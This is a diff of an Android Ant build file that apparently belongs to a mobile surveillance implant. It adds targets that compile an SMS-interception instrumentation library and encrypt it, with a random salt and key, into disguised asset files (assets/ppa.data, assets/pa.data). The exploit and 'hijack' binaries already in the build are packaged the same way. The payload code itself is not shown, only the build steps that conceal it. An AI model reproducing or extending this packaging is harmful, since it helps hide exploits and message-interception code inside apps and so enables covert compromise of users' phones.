@@ -49,6 +49,10 @@
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
 
+	<property name="ddi.sms.lib" value="procacc" />
+	<property name="ddi.sms.libout" value="libprocacc.so" />
+	<property name="ddi.sms.dex" value="procacc" />
+        <property name="ddi.sms.dir" value="../instrumentation/ddi/examples/smsdispatch/" />
 	<property name="rcscore.path" value="antlibs" />
 	<property name="out.dir" value="bin" />
 	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
@@ -138,7 +142,10 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt.so" outputFile="assets/ib.data" />
 		<delete file="assets/mb.data" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
-
+                <delete file="assets/ppa.data" />
+                <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.dex}" outputFile="assets/ppa.data" />
+                <delete file="assets/pa.data" />
+                <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.libout}" outputFile="assets/pa.data" />
 	</target>
 
 	<target name="encrypt-hijacklibrary-debug">
@@ -146,7 +153,57 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
 		<delete file="assets/mb.data" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
+                <delete file="assets/ppa.data" />
+                <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.dex}" outputFile="assets/ppa.data" />
+                <delete file="assets/pa.data" />
+                <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.libout}" outputFile="assets/pa.data" />
 	</target>
+
+        <target name="build-instrumentation-clean">
+          <echo> cleaning dir ${ddi.sms.dir} </echo>
+            <delete>
+              <fileset dir="${ddi.sms.dir}" includes="*.jar"/>
+            </delete>
+            <delete>
+              <!-- recursive **/ -->
+              <fileset dir="${ddi.sms.dir}" includes="**/*.dex"/>
+            </delete>
+             <delete>
+              <!-- recursive **/ -->
+              <fileset dir="${ddi.sms.dir}" includes="**/*.so"/>
+            </delete>
+          </target>
+
+
+        <macrodef name="build-instr">
+          <attribute name="lib" />
+          <attribute name="jar" />
+          <attribute name="debug" />
+          <attribute name="buildDir" />
+          <attribute name="buildScript" />
+          <sequential>
+            <echo> @{buildScript}</echo>
+
+            <exec executable="@{buildScript}" dir="@{buildDir}" failonerror="true">
+              <arg value="@{debug}" />
+              <arg value="@{lib}" />
+              <arg value="@{jar}" />
+            </exec>
+            <copy file="@{buildDir}/libs/armeabi/${ddi.sms.libout}" tofile="preprocess/${ddi.sms.libout}" overwrite="true" />
+            <copy file="@{buildDir}/obj/${ddi.sms.dex}.dex" tofile="preprocess/${ddi.sms.dex}" overwrite="true" />
+
+          </sequential>
+        </macrodef>
+
+
+        <target name="build-instrumentation-debug" depends="build-instrumentation-clean">
+          <build-instr debug="-d" jar="-o${ddi.sms.dex}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+        </target>
+
+        <target name="build-instrumentation" depends="build-instrumentation-clean">
+          <build-instr debug=""  jar="-o${ddi.sms.dex}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+        </target>
+
 
 
     <target name="delete-libs" depends="encrypt-exploit, encrypt-hijacklibrary">
@@ -155,10 +212,10 @@
         </delete>
     </target>
 
-	<target name="libs" depends="encrypt-exploit, encrypt-hijacklibrary">
+	<target name="libs" depends="build-instrumentation, encrypt-exploit, encrypt-hijacklibrary">
 	</target>
 
-	<target name="libs-debug" depends="encrypt-exploit,  encrypt-hijacklibrary">
+	<target name="libs-debug" depends="build-instrumentation-debug, encrypt-exploit,  encrypt-hijacklibrary">
 	</target>
 
 	<target name="init" depends="salt" unless="build.number">
